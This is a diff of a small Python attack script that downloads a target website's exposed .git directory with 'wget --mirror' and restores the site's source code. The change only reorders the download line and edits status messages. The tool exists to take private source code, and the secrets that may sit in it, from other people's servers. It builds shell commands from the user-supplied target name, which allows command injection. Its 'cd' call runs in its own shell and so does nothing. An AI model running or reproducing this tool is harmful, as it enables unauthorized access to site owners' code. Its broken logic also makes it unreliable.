@@ -24,15 +24,15 @@ def target():
             strtr()
         else:
             print("[*] Starting to download all target files, source codes, etc.")
-            os.system(f"wget --mirror -I .git https://{targt}/.git/")
             print("[*] This may take a few minutes...")
+            os.system(f"wget --mirror -I .git https://{targt}/.git/")
             sleep(1)
-            print("[]")
+            print("")
             os.system(f"cd {targt}")
             os.system(f"git status")
             os.system("git restore .")
             sleep(2)
-            print("[*] Done! you can view all the contents of the target")
+            print("[*] Done! you can view all the file contents and source codes of the target")
             exit()
 target()
 
